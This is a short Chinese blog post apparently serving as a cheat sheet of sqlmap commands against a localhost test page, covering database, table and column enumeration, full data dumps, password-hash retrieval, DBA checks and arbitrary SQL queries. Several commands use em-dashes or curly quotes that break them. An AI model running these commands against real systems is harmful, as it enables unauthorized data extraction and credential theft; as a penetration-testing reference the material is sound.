---
title: "sqlmap常用命令"
date: 2020-02-06
categories: ["other"]
tags: ["sqlmap"]
draft: false 
---
## 基本信息
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 5（5代表level,0-5）
```
## 所有dbs
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 5 --dbs
```
## 所有用户
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 5 —users
```
## 当前使用的db
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 5 --current-db
```
## 当前用户
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 5 --current-user
```
## 某个库所有表名
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 1 -D test —tables
```
## 某个表所有列名
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 0 -D test -T deskstatus —columns
```
## 某个表所有数据
```bash
sqlmap -u "http://localhost/test.php?id=11" -v 0 -D test -T deskstatus —dump
```
## 获取密码
```bash
sqlmap -u "http://localhost/test.php?id=11" --passwords
```
## 获取指定用户密码
```bash
sqlmap -u "http://localhost/test.php?id=11" --password -U root
```
## 获取指定列
```bash
sqlmap -u "http://localhost/test.php?id=11" -D test -T deskstatus -C field1 —dump
```
## sql查询

```bash
sqlmap -u "http://localhost/test.php?id=11" --sql-query "select * from mysql.user”
```
## 是否DBA
```bash
sqlmap -u "http://localhost/test.php?id=11" --is-dba
```
## sql版本
```bash
sqlmap -u "http://localhost/test.php?id=11" -b
```
## 输出到文件
```bash
sqlmap -u="http://localhost/test.php?id=11" -o "d:/log.txt”
```
## post请求
```bash
sqlmap -u "http://localhost/test.php?id=11" --data="cid=xxxxx;uid=xxxx;time=xxxxx;sign=xxxx%3D" --param-del=";"  —dbs
```